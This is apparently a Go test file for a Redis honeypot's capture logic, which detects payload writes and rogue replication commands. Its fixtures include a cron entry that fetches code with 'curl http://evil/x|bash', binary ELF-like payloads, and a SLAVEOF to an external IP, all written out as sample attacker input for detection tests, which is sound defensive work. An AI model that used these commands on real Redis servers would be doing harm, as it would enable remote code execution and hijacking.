package TCP

import (
	"bytes"
	"os"
	"strings"
	"testing"

	"github.com/mariocandela/beelzebub/v3/artifactstore"
)

func resp(args ...string) []byte {
	var b bytes.Buffer
	b.WriteString("*")
	b.WriteString(itoa(len(args)))
	b.WriteString("\r\n")
	for _, a := range args {
		b.WriteString("$")
		b.WriteString(itoa(len(a)))
		b.WriteString("\r\n")
		b.WriteString(a)
		b.WriteString("\r\n")
	}
	return b.Bytes()
}
func itoa(n int) string { // tiny helper to avoid strconv import churn in the test
	if n == 0 {
		return "0"
	}
	d := []byte{}
	for n > 0 {
		d = append([]byte{byte('0' + n%10)}, d...)
		n /= 10
	}
	return string(d)
}

func TestRedisWriteValue_Set(t *testing.T) {
	k, v, ok := redisWriteValue(resp("SET", "cron:job", "*/5 * * * * curl http://evil/x|bash"))
	if !ok || k != "cron:job" || string(v) != "*/5 * * * * curl http://evil/x|bash" {
		t.Fatalf("got key=%q val=%q ok=%v", k, v, ok)
	}
}
func TestRedisWriteValue_BinaryValuePreserved(t *testing.T) {
	payload := []byte{0x7f, 0x45, 0x4c, 0x46, 0x00, 0x01} // ELF-ish + NUL
	_, v, ok := redisWriteValue(resp("set", "k", string(payload)))
	if !ok || !bytes.Equal(v, payload) {
		t.Fatalf("binary value not preserved: %v ok=%v", v, ok)
	}
}
func TestRedisWriteValue_NonWriteIsFalse(t *testing.T) {
	if _, _, ok := redisWriteValue(resp("GET", "k")); ok {
		t.Fatal("GET must not be a write value")
	}
}
func TestRedisWriteValue_PartialFrameIsFalse(t *testing.T) {
	full := resp("SET", "k", "value")
	if _, _, ok := redisWriteValue(full[:len(full)-3]); ok {
		t.Fatal("truncated frame must return ok=false")
	}
}

func TestGate_SkipsSmallBenign(t *testing.T) {
	if shouldCaptureRedisValue("user:42:name", []byte("alice")) {
		t.Fatal("small printable benign value must not be captured")
	}
}
func TestGate_CapturesLarge(t *testing.T) {
	if !shouldCaptureRedisValue("k", bytes.Repeat([]byte("A"), 512)) {
		t.Fatal(">=512B value must be captured")
	}
}
func TestGate_CapturesBinary(t *testing.T) {
	if !shouldCaptureRedisValue("k", []byte{0x7f, 0x45, 0x4c, 0x46, 0x00}) {
		t.Fatal("binary value must be captured")
	}
}
func TestGate_CapturesStagingKey(t *testing.T) {
	if !shouldCaptureRedisValue("crackit:cron", []byte("short")) {
		t.Fatal("RCE-staging key must be captured even when small")
	}
}

func TestRepl_SlaveofEndpoint(t *testing.T) {
	h, p, isRepl := redisReplicationTarget(resp("SLAVEOF", "45.61.13.7", "6379"))
	if !isRepl || h != "45.61.13.7" || p != "6379" {
		t.Fatalf("got h=%q p=%q isRepl=%v", h, p, isRepl)
	}
}
func TestRepl_NoOne(t *testing.T) {
	h, p, isRepl := redisReplicationTarget(resp("REPLICAOF", "NO", "ONE"))
	if !isRepl || h != "" || p != "" {
		t.Fatalf("NO ONE should be repl-intent with no endpoint; got h=%q p=%q isRepl=%v", h, p, isRepl)
	}
}
func TestRepl_PsyncIsIntent(t *testing.T) {
	if _, _, isRepl := redisReplicationTarget(resp("PSYNC", "?", "-1")); !isRepl {
		t.Fatal("PSYNC must be replication intent")
	}
}
func TestRepl_NonReplicationFalse(t *testing.T) {
	if _, _, isRepl := redisReplicationTarget(resp("SET", "k", "v")); isRepl {
		t.Fatal("SET is not replication")
	}
}

// TestRedisCaptureHook is the integration test for the redisCaptureHook method
// wired into TCPStrategy. It verifies three scenarios:
//
//  1. A gated SET (large value ≥512 B or staging key) → one .bin written to
//     the temp artifact store dir + captured["artifact_sha256"] set.
//  2. A SLAVEOF command → captured["redis_replication_master"] set to "h:p",
//     no .bin written.
//  3. A small benign SET → nothing written, no captured keys set.
func TestRedisCaptureHook(t *testing.T) {
	dir := t.TempDir()
	s := &TCPStrategy{artifactStore: artifactstore.New(dir, 0, 0, 0)}

	// --- case 1: large SET on a staging key (triggers on either criterion) ---
	largeVal := strings.Repeat("A", 600) // ≥ redisCaptureMinBytes (512)
	cap1 := map[string]string{}
	s.redisCaptureHook(resp("SET", "crackit:cron", largeVal), cap1)

	if _, ok := cap1["artifact_sha256"]; !ok {
		t.Fatal("case1: expected artifact_sha256 to be set in captured map")
	}
	// Verify a .bin file was actually written to the store directory
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("case1: ReadDir: %v", err)
	}
	binCount := 0
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".bin") {
			binCount++
		}
	}
	if binCount != 1 {
		t.Fatalf("case1: expected 1 .bin in artifact dir, got %d", binCount)
	}

	// --- case 2: SLAVEOF → replication IOC, no artifact ---
	cap2 := map[string]string{}
	s.redisCaptureHook(resp("SLAVEOF", "45.61.13.7", "6379"), cap2)
	if cap2["redis_replication_master"] != "45.61.13.7:6379" {
		t.Fatalf("case2: replication IOC not recorded: %v", cap2)
	}
	if _, ok := cap2["artifact_sha256"]; ok {
		t.Fatal("case2: SLAVEOF must not write an artifact")
	}
	// Confirm no extra .bin appeared
	entries2, _ := os.ReadDir(dir)
	binCount2 := 0
	for _, e := range entries2 {
		if strings.HasSuffix(e.Name(), ".bin") {
			binCount2++
		}
	}
	if binCount2 != 1 {
		t.Fatalf("case2: bin count changed after SLAVEOF; expected 1 got %d", binCount2)
	}

	// --- case 3: small benign SET → no capture ---
	cap3 := map[string]string{}
	s.redisCaptureHook(resp("SET", "u:1", "alice"), cap3)
	if _, ok := cap3["artifact_sha256"]; ok {
		t.Fatal("case3: benign small SET must not capture an artifact")
	}
	if _, ok := cap3["redis_replication"]; ok {
		t.Fatal("case3: benign small SET must not set redis_replication")
	}
}
